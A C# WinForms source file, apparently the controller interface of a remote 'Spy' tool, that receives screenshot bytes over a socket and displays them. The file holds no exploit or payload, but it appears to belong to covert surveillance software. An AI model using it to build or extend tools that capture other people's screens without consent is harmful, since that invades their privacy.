using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

/*
 * 即时截屏 窗体
 */ 
namespace Spy.UI
{
    public partial class ScreenshotNow : Form
    {
        public Image Img;
        public bool flag;
        public ScreenshotNow()
        {
            InitializeComponent();
        }

        public void Screenshot()
        {
            try
            {
                byte[] b = new byte[4096];
                MemoryStream fs = new MemoryStream();
                int length = 0;
                while ((length = Cat.socket_command.s.Receive(b)) > 0)
                {
                    fs.Write(b, 0, length);
                }
                fs.Flush();
                Img = new Bitmap(fs);
                fs.Close();
                flag = true;
            }
            catch
            {
                flag = false;
            }
            
        }

        //查看大图
        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Picture pic = new Picture(Img);
            pic.Show();
        }
        //载入接收到的图片
        private void ScreenshotNow_Load(object sender, EventArgs e)
        {
            
            if (flag)
            {
                label2.Text = "成功";
                pictureBox1.Image = Img;
            }
            else
            {
                label2.Text = "失败";
            }
        }
    }
}
